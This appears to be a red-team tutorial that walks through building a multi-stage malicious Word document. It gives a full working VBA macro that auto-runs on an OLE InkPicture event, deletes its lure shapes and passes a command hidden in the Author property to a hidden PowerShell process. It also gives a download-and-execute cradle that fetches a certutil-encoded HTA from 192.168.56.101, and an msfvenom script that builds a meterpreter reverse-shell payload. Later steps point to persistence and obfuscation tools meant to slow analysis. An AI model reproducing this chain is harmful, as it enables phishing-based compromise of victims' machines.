# Multi-Stage Penetration-Testing / Red Teaming Malicious Word document creation process

The below paper documents the process of creating a multi-stage IPS/AV transparent malicious document for purposes of Red Teaming / Penetration-Testing assignments.

The resulted document will be:
- using OLE event autorun method
- removing it's pretext shapes
- Obtaining commands to be executed from document's _Author_ property and passing them to `StdIn` of _Powershell.exe_ process
- Leveraging `certutil` technique to receive Base64 encoded malicious HTA document
- Having Base64 encoded Powershell command in that _Author_ property
- Having fully Obfuscated VBA macro

---

1. Create an empty Word document with extension `.doc`

---

2. Create an OLE object named `Microsoft InkPicture Control` (_Developer tab -> Insert -> More controls -> ... _)

---

3. Double click on that OLE object and add the following method:

```
Public Once As Integer

Public Sub Launch()
    On Error Resume Next
    '
    ' Here will be malicious code placed
    '
End Sub

Private Sub InkPicture1_Painted(ByVal hDC As Long, ByVal Rect As MSINKAUTLib.IInkRectangle)
    If Once < 1 Then
        Launch
    End If
    Once = Once + 1
End Sub
```

Since the `Painted` event will be triggered several times, we want to avoid situation of having several stagers popped on the target machine.

---

4. Then, add pretext shape enticing victim to enable editing/macros - having that, insert a function that will delete this shape after victim really enable macros.
For example of such shape - you can refer to one of my [repos](https://github.com/mgeeky/RobustPentestMacro).

**NOTICE**: Make sure to put the OLE Control in the topmost left corner of the document and to color that control (right click -> Propertied -> Color) so it will overlap visually with Pretext-shape.
The trick is to make the victim move the mouse over that OLE control after enabling macros (making it trigger `Painted` event in the background).

The function that will delete this and OLE object shapes after enabling macros is placed below:

```
Public Sub Launch()
    On Error Resume Next
    DeleteWarningShape "warning-div", True
    DeleteWarningShape "Control 2", True
    ...
End Sub

Private Sub DeleteWarningShape(ByVal textBoxName As String, ByVal saveDocAfter As Boolean)
    Dim shape As Word.shape
    On Error Resume Next
    For Each shape In ActiveDocument.Shapes
        If StrComp(shape.Name, textBoxName) = 0 Then
            shape.Delete
            Exit For
        End If
    Next
    If saveDocAfter Then
        ActiveDocument.Save
    End If
End Sub
```

---

5. Now, add code obtaining malicious _Powershell_ commands from _Author_ document's property and passing it to the _Powershell's_ `StdIn` stream:

```
Public Sub Launch()
    On Error Resume Next
    DeleteWarningShape "warning-div", True
    DeleteWarningShape "Control 2", True    
    Dim authorProperty As String
    
    authorProperty = ActiveDocument.BuiltInDocumentProperties("Author")
    Set objWShell = CreateObject("WScr" & "ipt.S" & "hell")
    With objWShell.Exec("powe" & "rsh" & "ell.exe -no" & "p -w" & "indowstyle hid" & "den -Com" & "mand -")
        .StdIn.WriteLine authorProperty
        .StdIn.WriteBlankLine 1
        .Terminate
    End With
```

Of course, having that - you will have to remember to add proper Powershell command to be executed right into _Author_ property of the Word file.

---

6. Now, we have to insert some code into that _Author_ property. This code should do the following:
- Download Base64 encoded `encoded.crt` file containing malicious HTA code.
- Use `certutil -decode encoded.crt out.hta` command that will strip that Base64 layer.
- Make entire powershell code that shall be placed in _Author_ property Unicode-Base64 encoded in such a way, that Powershell's `-EncodedCommand` will be able to process.

The following code can be use as an example:

```
powershell -ep bypass -Command "(new-object Net.WebClient).DownloadFile('http://192.168.56.101/encoded.crt','%TEMP%\encoded.crt');certutil -decode %TEMP%\encoded.crt %TEMP%\encoded.hta;start %TEMP%\encoded.hta"
```

Here, the file will be obtained from `http://192.168.56.101/encoded.crt` - of course, one will want to move that file into HTTPS webserver having some luring domain name.

This command can be then converted into Powershell-supported Base64 payload like so:

```
C:\Users\IEUser\Desktop\files\dl>powershell -ep bypass -command "[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(\"(new-object Net.WebClient).DownloadFile('http://192.168.56.101/encoded.crt','%TEMP%\encoded.crt');certutil -decode %TEMP%\encoded.crt %TEMP%\encoded.hta;start %TEMP%\encoded.hta\"))"
KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADUANgAuADEAMAAxAC8AZQBuAGMAbwBkAGUAZAAuAGMAcgB0ACcALAAnAEMAOgBcAFUAcwBlAHIAcwBcAEkARQBVAHMAZQByAFwAQQBwAHAARABhAHQAYQBcAEwAbwBjAGEAbABcAFQAZQBtAHAAXABlAG4AYwBvAGQAZQBkAC4AYwByAHQAJwApADsAYwBlAHIAdAB1AHQAaQBsACAALQBkAGUAYwBvAGQAZQAgAEMAOgBcAFUAcwBlAHIAcwBcAEkARQBVAHMAZQByAFwAQQBwAHAARABhAHQAYQBcAEwAbwBjAGEAbABcAFQAZQBtAHAAXABlAG4AYwBvAGQAZQBkAC4AYwByAHQAIABDADoAXABVAHMAZQByAHMAXABJAEUAVQBzAGUAcgBcAEEAcABwAEQAYQB0AGEAXABMAG8AYwBhAGwAXABUAGUAbQBwAFwAZQBuAGMAbwBkAGUAZAAuAGgAdABhADsAcwB0AGEAcgB0ACAAQwA6AFwAVQBzAGUAcgBzAFwASQBFAFUAcwBlAHIAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAVABlAG0AcABcAGUAbgBjAG8AZABlAGQALgBoAHQAYQA=
```

Now this code is to be placed into _Author_ property.

---

7. Now, in order to generate that `encoded.crt` file - go for the following steps:

- Step 1: Using `msfvenom` generate malicious HTA file
- Step 2: Convert that payload into Base64-encoded certificate file.

In order to automate above steps - you can use the below script:

```
#!/bin/bash

# --- PAYLOAD SETUP

LHOST=192.168.56.101
LPORT=4444
PAYLOAD=windows/meterpreter/reverse_tcp

# This file must have *.crt extension
OUTPUT_FILE=/var/www/html/encoded.crt

PAYLOAD_FILE=/tmp/test$RANDOM

# ----

msfvenom -f hta-psh -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -o $PAYLOAD_FILE

echo -----BEGIN CERTIFICATE----- > $OUTPUT_FILE
cat $PAYLOAD_FILE | base64 -w 0 >> $OUTPUT_FILE
echo -----END CERTIFICATE----- >> $OUTPUT_FILE

chown www-data:www-data $OUTPUT_FILE 2> /dev/null
echo "Generated file: $OUTPUT_FILE"
```

And Voila! You will have your `encoded.crt` file in webroot.

---

8. After that you can add some persistence methods and further fail-proof the Macro code. For a nice example of persistence method - the `WMIPersistence` method can be used:

[WMIPersistence](https://gist.github.com/mgeeky/d00ba855d2af73fd8d7446df0f64c25a)

---

9. After that, you will want to make the entire VBA macro code become obfuscated to further slow down analysis process.

The obfuscation can easily be pulled off using my [VisualBasicObfuscator](https://github.com/mgeeky/VisualBasicObfuscator)


---

## ENTIRE MACRO CAN LOOK LIKE THIS:

(without persistence method)

```
Public Once As Integer

Public Sub Launch()
    On Error Resume Next
    DeleteWarningShape "warning-div", False
    DeleteWarningShape "Control 2", False
    
    Dim authorProperty As String
    authorProperty = ActiveDocument.BuiltInDocumentProperties("Author")
    Set objWShell = CreateObject("WScr" & "ipt.S" & "hell")
    With objWShell.Exec("powe" & "rsh" & "ell.exe -no" & "p -w" & "indowstyle hid" & "den -Com" & "mand -")
        .StdIn.WriteLine authorProperty
        .StdIn.WriteBlankLine 1
        .Terminate
    End With
End Sub

Private Sub DeleteWarningShape(ByVal textBoxName As String, ByVal saveDocAfter As Boolean)
    Dim shape As Word.shape
    On Error Resume Next
    For Each shape In ActiveDocument.Shapes
        If StrComp(shape.Name, textBoxName) = 0 Then
            shape.Delete
            Exit For
        End If
    Next
    If saveDocAfter Then
        ActiveDocument.Save
    End If
End Sub

Private Sub InkPicture1_Painted(ByVal hDC As Long, ByVal Rect As MSINKAUTLib.IInkRectangle)
    If Once < 1 Then
        Launch
    End If
    Once = Once + 1
End Sub
```
